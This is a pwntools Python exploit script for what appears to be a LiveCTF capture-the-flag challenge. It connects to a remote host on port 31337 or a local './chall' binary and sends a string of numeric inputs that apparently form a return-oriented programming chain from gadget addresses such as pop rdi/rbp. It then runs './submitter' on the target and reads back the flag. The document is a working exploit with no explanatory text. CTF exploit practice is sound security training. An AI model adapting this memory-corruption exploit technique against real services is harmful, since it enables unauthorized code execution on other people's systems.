#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
SUBMIT = True

def conn():
    if SUBMIT:
        HOST = os.environ.get("HOST", "localhost")
        PORT = 31337
        r = remote(HOST, int(PORT))
    else:
        r = process(["./chall"])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                b *0x00401a55
                #b *0x00401a24
            """)
    return r

r = conn()

def addr(val):
    r.sendlineafter(b"pls:", str(val).encode())

def main():
    for i in range(4):
        addr(400000001)
    #addr(402218)
    addraxrdi = 426896
    poprdirbp = 402218
    addr(poprdirbp)
    addr(363221)
    addr(1)
    addr(426497)
    addr(493952)
    addr(493952)
    addr(493952)
    addr(493952)
    addr(493952)
    addr(493957)
    addr(401914)
    r.sendlineafter(b"pls:", b"0\xde\xad")
    
    r.sendline(b'./submitter')
    flag = r.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)
    r.interactive() 

if __name__ == "__main__":
    main()
